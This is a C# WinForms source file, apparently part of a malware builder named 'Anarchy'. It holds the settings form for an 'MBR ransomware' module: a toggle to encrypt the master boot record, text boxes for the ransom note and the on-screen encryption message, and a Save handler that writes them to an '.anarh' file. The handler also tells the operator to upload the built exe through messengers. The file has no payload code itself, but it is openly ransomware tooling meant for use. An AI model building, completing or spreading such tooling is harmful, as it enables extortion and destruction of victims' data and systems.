using System;
using System.ComponentModel;
using System.IO;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Siticone.UI.WinForms;

namespace Anarchy.Forms;

public class Musik : Form
{
    private IContainer components;

    private Label label4;

    private SiticoneOSToggleSwith siticoneOSToggleSwith1;

    private Guna2TabControl guna2TabControl2;

    private TabPage tabPage5;

    private TabPage tabPage1;

    private Guna2TextBox TextBox2;

    private Guna2GroupBox guna2GroupBox1;

    private Guna2GroupBox guna2GroupBox2;

    private Guna2TextBox guna2TextBox_0;

    private Guna2Panel guna2Panel2;

    private SiticoneControlBox siticoneControlBox4;

    private SiticoneControlBox siticoneControlBox3;

    private Label label1;

    private Guna2Button guna2Button1;

    private Guna2DragControl guna2DragControl1;

    private Guna2BorderlessForm guna2BorderlessForm1;

    public Musik()
    {
        this.InitializeComponent();
    }

    private void Musik_Load(object sender, EventArgs e)
    {
    }

    private void guna2ImageButton1_Click(object sender, EventArgs e)
    {
    }

    private void tabPage1_Click(object sender, EventArgs e)
    {
    }

    private void guna2Button1_Click(object sender, EventArgs e)
    {
        SaveFileDialog saveFileDialog;
        saveFileDialog = new SaveFileDialog();
        saveFileDialog.Filter = "Ransomware>OpSlAja (mbr) (*.anarh)|*.anarh|Все файлы (*.*)|*.*";
        if (saveFileDialog.ShowDialog() == DialogResult.OK)
        {
            StreamWriter streamWriter;
            streamWriter = new StreamWriter(saveFileDialog.FileName);
            streamWriter.WriteLine(this.TextBox2.Text);
            streamWriter.WriteLine(this.guna2TextBox_0.Text);
            streamWriter.Close();
            MessageBox.Show("Upload the exe file you created for me to one of the messengers (I'll make it work).", "Important!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
    }

    private void siticoneOSToggleSwith1_CheckedChanged(object sender, EventArgs e)
    {
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Musik));
        this.label4 = new System.Windows.Forms.Label();
        this.siticoneOSToggleSwith1 = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
        this.guna2TabControl2 = new Guna.UI2.WinForms.Guna2TabControl();
        this.tabPage1 = new System.Windows.Forms.TabPage();
        this.guna2GroupBox1 = new Guna.UI2.WinForms.Guna2GroupBox();
        this.TextBox2 = new Guna.UI2.WinForms.Guna2TextBox();
        this.tabPage5 = new System.Windows.Forms.TabPage();
        this.guna2GroupBox2 = new Guna.UI2.WinForms.Guna2GroupBox();
        this.guna2TextBox_0 = new Guna.UI2.WinForms.Guna2TextBox();
        this.guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
        this.label1 = new System.Windows.Forms.Label();
        this.siticoneControlBox4 = new Siticone.UI.WinForms.SiticoneControlBox();
        this.siticoneControlBox3 = new Siticone.UI.WinForms.SiticoneControlBox();
        this.guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
        this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
        this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
        this.guna2TabControl2.SuspendLayout();
        this.tabPage1.SuspendLayout();
        this.guna2GroupBox1.SuspendLayout();
        this.tabPage5.SuspendLayout();
        this.guna2GroupBox2.SuspendLayout();
        this.guna2Panel2.SuspendLayout();
        base.SuspendLayout();
        this.label4.AutoSize = true;
        this.label4.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.label4.Font = new System.Drawing.Font("Segoe UI", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.label4.ForeColor = System.Drawing.Color.Honeydew;
        this.label4.Location = new System.Drawing.Point(45, 6);
        this.label4.Name = "label4";
        this.label4.Size = new System.Drawing.Size(87, 17);
        this.label4.TabIndex = 72;
        this.label4.Text = "Encrypt MBR";
        this.siticoneOSToggleSwith1.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.siticoneOSToggleSwith1.Checked = true;
        this.siticoneOSToggleSwith1.Location = new System.Drawing.Point(5, 3);
        this.siticoneOSToggleSwith1.Name = "siticoneOSToggleSwith1";
        this.siticoneOSToggleSwith1.Size = new System.Drawing.Size(38, 22);
        this.siticoneOSToggleSwith1.TabIndex = 71;
        this.siticoneOSToggleSwith1.Text = "off";
        this.siticoneOSToggleSwith1.CheckedChanged += new System.EventHandler(siticoneOSToggleSwith1_CheckedChanged);
        this.guna2TabControl2.Controls.Add(this.tabPage1);
        this.guna2TabControl2.Controls.Add(this.tabPage5);
        this.guna2TabControl2.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.guna2TabControl2.ItemSize = new System.Drawing.Size(150, 22);
        this.guna2TabControl2.Location = new System.Drawing.Point(0, 32);
        this.guna2TabControl2.Name = "guna2TabControl2";
        this.guna2TabControl2.SelectedIndex = 0;
        this.guna2TabControl2.Size = new System.Drawing.Size(529, 426);
        this.guna2TabControl2.TabButtonHoverState.BorderColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2TabControl2.TabButtonHoverState.FillColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2TabControl2.TabButtonHoverState.Font = new System.Drawing.Font("Segoe UI Semibold", 10f);
        this.guna2TabControl2.TabButtonHoverState.ForeColor = System.Drawing.Color.White;
        this.guna2TabControl2.TabButtonHoverState.InnerColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2TabControl2.TabButtonIdleState.BorderColor = System.Drawing.Color.Transparent;
        this.guna2TabControl2.TabButtonIdleState.FillColor = System.Drawing.Color.Transparent;
        this.guna2TabControl2.TabButtonIdleState.Font = new System.Drawing.Font("Segoe UI Semibold", 10f);
        this.guna2TabControl2.TabButtonIdleState.ForeColor = System.Drawing.Color.Honeydew;
        this.guna2TabControl2.TabButtonIdleState.InnerColor = System.Drawing.Color.FromArgb(36, 36, 36);
        this.guna2TabControl2.TabButtonSelectedState.BorderColor = System.Drawing.Color.FromArgb(30, 30, 30);
        this.guna2TabControl2.TabButtonSelectedState.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
        this.guna2TabControl2.TabButtonSelectedState.Font = new System.Drawing.Font("Segoe UI Semibold", 10f);
        this.guna2TabControl2.TabButtonSelectedState.ForeColor = System.Drawing.Color.White;
        this.guna2TabControl2.TabButtonSelectedState.InnerColor = System.Drawing.Color.Crimson;
        this.guna2TabControl2.TabButtonSize = new System.Drawing.Size(150, 22);
        this.guna2TabControl2.TabIndex = 79;
        this.guna2TabControl2.TabMenuBackColor = System.Drawing.Color.FromArgb(30, 30, 30);
        this.guna2TabControl2.TabMenuOrientation = Guna.UI2.WinForms.TabMenuOrientation.HorizontalTop;
        this.tabPage1.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
        this.tabPage1.Controls.Add(this.guna2GroupBox1);
        this.tabPage1.Controls.Add(this.label4);
        this.tabPage1.Controls.Add(this.siticoneOSToggleSwith1);
        this.tabPage1.Location = new System.Drawing.Point(4, 26);
        this.tabPage1.Name = "tabPage1";
        this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
        this.tabPage1.Size = new System.Drawing.Size(521, 396);
        this.tabPage1.TabIndex = 3;
        this.tabPage1.Text = "Message Encryption";
        this.tabPage1.Click += new System.EventHandler(tabPage1_Click);
        this.guna2GroupBox1.BorderColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2GroupBox1.Controls.Add(this.TextBox2);
        this.guna2GroupBox1.CustomBorderColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.guna2GroupBox1.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
        this.guna2GroupBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2GroupBox1.ForeColor = System.Drawing.Color.FromArgb(125, 137, 149);
        this.guna2GroupBox1.Location = new System.Drawing.Point(6, 33);
        this.guna2GroupBox1.Name = "guna2GroupBox1";
        this.guna2GroupBox1.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 64, 64);
        this.guna2GroupBox1.ShadowDecoration.Enabled = true;
        this.guna2GroupBox1.Size = new System.Drawing.Size(509, 357);
        this.guna2GroupBox1.TabIndex = 143;
        this.guna2GroupBox1.Text = "Message During Encryption";
        this.TextBox2.Animated = true;
        this.TextBox2.BackColor = System.Drawing.Color.Transparent;
        this.TextBox2.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.TextBox2.BorderRadius = 5;
        this.TextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TextBox2.DefaultText = resources.GetString("TextBox2.DefaultText");
        this.TextBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.TextBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.TextBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.TextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.TextBox2.FillColor = System.Drawing.Color.Black;
        this.TextBox2.FocusedState.BorderColor = System.Drawing.Color.Crimson;
        this.TextBox2.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TextBox2.HoverState.BorderColor = System.Drawing.Color.Crimson;
        this.TextBox2.Location = new System.Drawing.Point(12, 43);
        this.TextBox2.MaxLength = 3000;
        this.TextBox2.Multiline = true;
        this.TextBox2.Name = "TextBox2";
        this.TextBox2.PasswordChar = '\0';
        this.TextBox2.PlaceholderText = "";
        this.TextBox2.SelectedText = "";
        this.TextBox2.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.TextBox2.ShadowDecoration.Depth = 10;
        this.TextBox2.ShadowDecoration.Enabled = true;
        this.TextBox2.Size = new System.Drawing.Size(485, 301);
        this.TextBox2.Style = Guna.UI2.WinForms.Enums.TextBoxStyle.Material;
        this.TextBox2.TabIndex = 75;
        this.tabPage5.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
        this.tabPage5.Controls.Add(this.guna2GroupBox2);
        this.tabPage5.Location = new System.Drawing.Point(4, 26);
        this.tabPage5.Name = "tabPage5";
        this.tabPage5.Size = new System.Drawing.Size(521, 396);
        this.tabPage5.TabIndex = 2;
        this.tabPage5.Text = "Message Ransomware";
        this.guna2GroupBox2.BorderColor = System.Drawing.Color.FromArgb(30, 32, 37);
        this.guna2GroupBox2.Controls.Add(this.guna2TextBox_0);
        this.guna2GroupBox2.CustomBorderColor = System.Drawing.Color.FromArgb(32, 32, 32);
        this.guna2GroupBox2.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
        this.guna2GroupBox2.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2GroupBox2.ForeColor = System.Drawing.Color.FromArgb(125, 137, 149);
        this.guna2GroupBox2.Location = new System.Drawing.Point(10, 13);
        this.guna2GroupBox2.Name = "guna2GroupBox2";
        this.guna2GroupBox2.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 64, 64);
        this.guna2GroupBox2.ShadowDecoration.Enabled = true;
        this.guna2GroupBox2.Size = new System.Drawing.Size(509, 367);
        this.guna2GroupBox2.TabIndex = 144;
        this.guna2GroupBox2.Text = "Message Ransomware";
        this.guna2TextBox_0.Animated = true;
        this.guna2TextBox_0.BackColor = System.Drawing.Color.Transparent;
        this.guna2TextBox_0.BorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.guna2TextBox_0.BorderRadius = 5;
        this.guna2TextBox_0.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.guna2TextBox_0.DefaultText = resources.GetString("التشفير.DefaultText");
        this.guna2TextBox_0.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
        this.guna2TextBox_0.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
        this.guna2TextBox_0.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.guna2TextBox_0.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
        this.guna2TextBox_0.FillColor = System.Drawing.Color.Black;
        this.guna2TextBox_0.FocusedState.BorderColor = System.Drawing.Color.Crimson;
        this.guna2TextBox_0.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2TextBox_0.HoverState.BorderColor = System.Drawing.Color.Crimson;
        this.guna2TextBox_0.Location = new System.Drawing.Point(12, 43);
        this.guna2TextBox_0.MaxLength = 3000;
        this.guna2TextBox_0.Multiline = true;
        this.guna2TextBox_0.Name = "التشفير";
        this.guna2TextBox_0.PasswordChar = '\0';
        this.guna2TextBox_0.PlaceholderText = "ed";
        this.guna2TextBox_0.SelectedText = "";
        this.guna2TextBox_0.ShadowDecoration.Color = System.Drawing.Color.FromArgb(64, 72, 75);
        this.guna2TextBox_0.ShadowDecoration.Depth = 10;
        this.guna2TextBox_0.ShadowDecoration.Enabled = true;
        this.guna2TextBox_0.Size = new System.Drawing.Size(485, 309);
        this.guna2TextBox_0.Style = Guna.UI2.WinForms.Enums.TextBoxStyle.Material;
        this.guna2TextBox_0.TabIndex = 75;
        this.guna2Panel2.BackColor = System.Drawing.Color.Transparent;
        this.guna2Panel2.Controls.Add(this.label1);
        this.guna2Panel2.Controls.Add(this.siticoneControlBox4);
        this.guna2Panel2.Controls.Add(this.siticoneControlBox3);
        this.guna2Panel2.CustomBorderColor = System.Drawing.Color.FromArgb(64, 72, 75);
        this.guna2Panel2.CustomBorderThickness = new System.Windows.Forms.Padding(0, 0, 1, 0);
        this.guna2Panel2.Dock = System.Windows.Forms.DockStyle.Top;
        this.guna2Panel2.Location = new System.Drawing.Point(0, 0);
        this.guna2Panel2.Name = "guna2Panel2";
        this.guna2Panel2.ShadowDecoration.Color = System.Drawing.Color.White;
        this.guna2Panel2.ShadowDecoration.Depth = 15;
        this.guna2Panel2.Size = new System.Drawing.Size(532, 28);
        this.guna2Panel2.TabIndex = 116;
        this.label1.AutoSize = true;
        this.label1.Font = new System.Drawing.Font("Segoe UI", 10f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.label1.ForeColor = System.Drawing.Color.Honeydew;
        this.label1.Location = new System.Drawing.Point(5, 5);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(180, 19);
        this.label1.TabIndex = 74;
        this.label1.Text = "Ransomware MBR | Settings";
        this.siticoneControlBox4.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.siticoneControlBox4.BackColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox4.BorderRadius = 10;
        this.siticoneControlBox4.ControlBoxType = Siticone.UI.WinForms.Enums.ControlBoxType.MinimizeBox;
        this.siticoneControlBox4.FillColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox4.HoveredState.Parent = this.siticoneControlBox4;
        this.siticoneControlBox4.IconColor = System.Drawing.Color.White;
        this.siticoneControlBox4.Location = new System.Drawing.Point(433, 5);
        this.siticoneControlBox4.Name = "siticoneControlBox4";
        this.siticoneControlBox4.ShadowDecoration.Parent = this.siticoneControlBox4;
        this.siticoneControlBox4.Size = new System.Drawing.Size(45, 21);
        this.siticoneControlBox4.TabIndex = 21;
        this.siticoneControlBox3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.siticoneControlBox3.BackColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox3.BorderRadius = 10;
        this.siticoneControlBox3.FillColor = System.Drawing.Color.Transparent;
        this.siticoneControlBox3.HoveredState.Parent = this.siticoneControlBox3;
        this.siticoneControlBox3.IconColor = System.Drawing.Color.White;
        this.siticoneControlBox3.Location = new System.Drawing.Point(484, 5);
        this.siticoneControlBox3.Name = "siticoneControlBox3";
        this.siticoneControlBox3.PressedColor = System.Drawing.Color.DarkRed;
        this.siticoneControlBox3.ShadowDecoration.Parent = this.siticoneControlBox3;
        this.siticoneControlBox3.Size = new System.Drawing.Size(45, 21);
        this.siticoneControlBox3.TabIndex = 20;
        this.guna2Button1.BorderRadius = 8;
        this.guna2Button1.CustomBorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.guna2Button1.CustomBorderThickness = new System.Windows.Forms.Padding(1);
        this.guna2Button1.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
        this.guna2Button1.Font = new System.Drawing.Font("Segoe UI", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.guna2Button1.ForeColor = System.Drawing.Color.White;
        this.guna2Button1.Location = new System.Drawing.Point(436, 33);
        this.guna2Button1.Name = "guna2Button1";
        this.guna2Button1.Size = new System.Drawing.Size(88, 22);
        this.guna2Button1.TabIndex = 75;
        this.guna2Button1.Text = "Save";
        this.guna2Button1.Click += new System.EventHandler(guna2Button1_Click);
        this.guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
        this.guna2DragControl1.TargetControl = this.guna2Panel2;
        this.guna2DragControl1.UseTransparentDrag = true;
        this.guna2BorderlessForm1.BorderRadius = 7;
        this.guna2BorderlessForm1.ContainerControl = this;
        this.guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
        this.guna2BorderlessForm1.ResizeForm = false;
        this.guna2BorderlessForm1.ShadowColor = System.Drawing.Color.Red;
        this.guna2BorderlessForm1.TransparentWhileDrag = true;
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Inherit;
        this.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
        base.ClientSize = new System.Drawing.Size(532, 458);
        base.Controls.Add(this.guna2Button1);
        base.Controls.Add(this.guna2Panel2);
        base.Controls.Add(this.guna2TabControl2);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Name = "Musik";
        base.Opacity = 0.96;
        base.ShowIcon = false;
        base.ShowInTaskbar = false;
        base.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        base.Load += new System.EventHandler(Musik_Load);
        this.guna2TabControl2.ResumeLayout(false);
        this.tabPage1.ResumeLayout(false);
        this.tabPage1.PerformLayout();
        this.guna2GroupBox1.ResumeLayout(false);
        this.tabPage5.ResumeLayout(false);
        this.guna2GroupBox2.ResumeLayout(false);
        this.guna2Panel2.ResumeLayout(false);
        this.guna2Panel2.PerformLayout();
        base.ResumeLayout(false);
    }
}